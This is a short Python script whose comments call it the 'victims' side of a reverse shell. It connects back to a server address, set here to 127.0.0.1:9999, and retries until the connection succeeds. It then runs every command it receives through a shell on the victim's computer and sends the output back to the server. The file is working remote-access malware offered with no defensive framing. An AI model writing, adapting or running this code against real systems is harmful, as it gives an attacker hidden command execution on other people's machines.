## "Victims thing"
##  Importing
import socket
from colorama import Fore
import subprocess 
# so here we import shit

# then here we put the ip ect
server_ip = '127.0.0.1'
server_port = 9999
print(server_ip + ":" + str(f"{server_port}")) 


#this function executes the command on the victims computer
def options(command):
    msg = "Command output:\n"
    msg += subprocess.check_output(command, shell=True, universal_newlines=True)
    return msg


#we create a socket tcp ipv4

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    connected = False
    # we will wait until the socket get a connection
    while not connected:
        try:
            #we try to connect to the server
            s.connect((server_ip, server_port))
            print(Fore.GREEN + "Connected to server")
            connected = True
        except:
            pass
    while True:
        #here we receive the command
        data = s.recv(4096)
        #we decode it
        msg = data.decode("utf-8")
        #if message is exit we leave
        if msg == "exit":
            print(Fore.RED + "Server Stopped Connection")
            break
        else:
            #else we run the command and send the outpput
            try:
                output = options(msg)
                s.send(str.encode(output)) 
            except Exception :
                pass
        